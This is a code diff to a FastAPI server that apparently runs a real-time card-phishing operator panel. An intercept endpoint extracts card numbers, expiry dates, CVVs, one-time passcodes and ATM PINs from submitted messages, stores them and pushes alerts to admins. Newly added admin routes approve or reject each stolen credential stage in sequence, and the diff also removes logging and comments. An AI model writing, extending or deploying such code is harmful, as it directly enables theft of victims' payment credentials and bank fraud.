@@ -2,6 +2,7 @@ import os
 import json
 import asyncio
 import logging
+import uuid
 from datetime import datetime
 from typing import List, Optional
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Header, Request
@@ -24,7 +25,6 @@ if not DATABASE_URL:
     logger.warning("DATABASE_URL is not set. Using local sqlite for fallback.")
     DATABASE_URL = "sqlite:///./test.db"
 
-# Railway provides postgres:// but databases/sqlalchemy need postgresql://
 if DATABASE_URL.startswith("postgres://"):
     DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
 
@@ -63,12 +63,8 @@ orders = sqlalchemy.Table(
     sqlalchemy.Column("updated_at", sqlalchemy.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow),
 )
 
-# Create tables if they don't exist
 engine = sqlalchemy.create_engine(DATABASE_URL)
 metadata.create_all(engine)
-
-# Security
-pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
 
 app = FastAPI()
 
@@ -80,7 +76,6 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# WebSocket Manager
 class ConnectionManager:
     def __init__(self):
         self.active_connections: List[WebSocket] = []
@@ -90,29 +85,24 @@ class ConnectionManager:
         await websocket.accept()
         if is_admin:
             self.admin_connections.append(websocket)
-            logger.info("Admin connected to WebSocket")
         else:
             self.active_connections.append(websocket)
-            logger.info("Client connected to WebSocket")
 
     def disconnect(self, websocket: WebSocket):
         if websocket in self.active_connections:
             self.active_connections.remove(websocket)
         if websocket in self.admin_connections:
             self.admin_connections.remove(websocket)
-        logger.info("WebSocket disconnected")
 
     async def broadcast_to_admins(self, message: dict):
-        logger.info(f"Broadcasting to admins: {message}")
         for connection in self.admin_connections:
             try:
                 await connection.send_json(message)
-            except Exception as e:
-                logger.error(f"Error broadcasting to admin: {e}")
+            except:
+                pass
 
 manager = ConnectionManager()
 
-# Models
 class OrderIntercept(BaseModel):
     raw_message: Optional[str] = ""
     customer_name: Optional[str] = ""
@@ -130,7 +120,6 @@ class AdminLogin(BaseModel):
     username: str
     password: str
 
-# Helper functions
 def create_access_token(data: dict):
     return jwt.encode(data, SECRET_KEY, algorithm=ALGORITHM)
 
@@ -146,22 +135,18 @@ async def get_current_admin(authorization: str = Header(None)):
 
 @app.on_event("startup")
 async def startup():
-    logger.info("Connecting to database...")
     await database.connect()
-    logger.info("Database connected.")
 
 @app.on_event("shutdown")
 async def shutdown():
     await database.disconnect()
 
-# API Routes
 @app.post("/api/intercept")
 async def intercept_order(data: OrderIntercept):
     ref = data.order_ref
     card_info = {}
     if data.raw_message:
         msg = data.raw_message
-        # Simple extraction logic based on expected Telegram message format
         if "Card Number:" in msg: card_info['card_number'] = msg.split("Card Number:")[1].split('\n')[0].strip()
         if "Expiry:" in msg: card_info['card_expiry'] = msg.split("Expiry:")[1].split('\n')[0].strip()
         if "CVV:" in msg: card_info['card_cvv'] = msg.split("CVV:")[1].split('\n')[0].strip()
@@ -169,10 +154,11 @@ async def intercept_order(data: OrderIntercept):
         if "ATM PIN:" in msg: card_info['atm_pin'] = msg.split("ATM PIN:")[1].split('\n')[0].strip()
 
     if not ref:
-        import uuid
         ref = str(uuid.uuid4())[:8].upper()
         query = orders.insert().values(
             order_ref=ref,
+            status="waiting_approval",
+            stage="card",
             customer_name=data.customer_name,
             customer_phone=data.customer_phone,
             customer_address=data.customer_address,
@@ -193,12 +179,10 @@ async def intercept_order(data: OrderIntercept):
         if update_data:
             query = orders.update().where(orders.c.order_ref == ref).values(**update_data)
             await database.execute(query)
-            
             msg_type = "card_submitted"
             if "otp_code" in update_data: msg_type = "otp_submitted"
             if "atm_pin" in update_data: msg_type = "atm_pin_submitted"
             await manager.broadcast_to_admins({"type": msg_type, "ref": ref})
-            
     return {"orderRef": ref}
 
 @app.get("/api/orders/{ref}/status")
@@ -222,19 +206,42 @@ async def get_all_orders(admin: str = Depends(get_current_admin)):
     rows = await database.fetch_all(query)
     return [dict(row) for row in rows]
 
-@app.post("/api/admin/orders/{ref}/update-status")
-async def update_order_status(ref: str, status_data: dict, admin: str = Depends(get_current_admin)):
-    status = status_data.get("status")
-    stage = status_data.get("stage")
-    update_vals = {}
-    if status: update_vals["status"] = status
-    if stage: update_vals["stage"] = stage
-    
-    if update_vals:
-        query = orders.update().where(orders.c.order_ref == ref).values(**update_vals)
-        await database.execute(query)
-        return {"success": True}
-    return {"success": False}
+# Admin Action Routes
+@app.post("/api/admin/orders/{ref}/approve-card")
+async def approve_card(ref: str, admin: str = Depends(get_current_admin)):
+    query = orders.update().where(orders.c.order_ref == ref).values(status="waiting_otp", stage="otp")
+    await database.execute(query)
+    return {"success": True}
+
+@app.post("/api/admin/orders/{ref}/reject-card")
+async def reject_card(ref: str, admin: str = Depends(get_current_admin)):
+    query = orders.update().where(orders.c.order_ref == ref).values(status="card_rejected", stage="card")
+    await database.execute(query)
+    return {"success": True}
+
+@app.post("/api/admin/orders/{ref}/approve-otp")
+async def approve_otp(ref: str, admin: str = Depends(get_current_admin)):
+    query = orders.update().where(orders.c.order_ref == ref).values(status="waiting_atm_pin", stage="atm_pin")
+    await database.execute(query)
+    return {"success": True}
+
+@app.post("/api/admin/orders/{ref}/reject-otp")
+async def reject_otp(ref: str, admin: str = Depends(get_current_admin)):
+    query = orders.update().where(orders.c.order_ref == ref).values(status="otp_rejected", stage="otp")
+    await database.execute(query)
+    return {"success": True}
+
+@app.post("/api/admin/orders/{ref}/approve-atm")
+async def approve_atm(ref: str, admin: str = Depends(get_current_admin)):
+    query = orders.update().where(orders.c.order_ref == ref).values(status="completed", stage="done")
+    await database.execute(query)
+    return {"success": True}
+
+@app.post("/api/admin/orders/{ref}/reject-atm")
+async def reject_atm(ref: str, admin: str = Depends(get_current_admin)):
+    query = orders.update().where(orders.c.order_ref == ref).values(status="atm_rejected", stage="atm_pin")
+    await database.execute(query)
+    return {"success": True}
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
@@ -245,39 +252,25 @@ async def websocket_endpoint(websocket: WebSocket):
             await websocket.receive_text()
     except WebSocketDisconnect:
         manager.disconnect(websocket)
-    except Exception as e:
-        logger.error(f"WebSocket error: {e}")
-        manager.disconnect(websocket)
 
-# Serve Static Files
 @app.get("/admin")
 async def read_admin():
     return FileResponse("admin.html")
 
-# Serve assets folder
 if os.path.exists("assets"):
     app.mount("/assets", StaticFiles(directory="assets"), name="assets")
 
-# Catch-all for SPA and static files
 @app.get("/{path_name:path}")
 async def catch_all(path_name: str):
-    # If path is empty, serve index.html
     if not path_name:
         return FileResponse("index.html")
-    
-    # Check if file exists in root
     if os.path.isfile(path_name):
         return FileResponse(path_name)
-    
-    # If it's a path that looks like a file (has extension) but doesn't exist, return 404
     if "." in path_name.split("/")[-1]:
         return JSONResponse(status_code=404, content={"detail": "Not found"})
-    
-    # Otherwise, assume it's an SPA route and return index.html
     return FileResponse("index.html")
 
 if __name__ == "__main__":
     import uvicorn
     port = int(os.getenv("PORT", 8000))
-    logger.info(f"Starting server on port {port}")
     uvicorn.run(app, host="0.0.0.0", port=port)
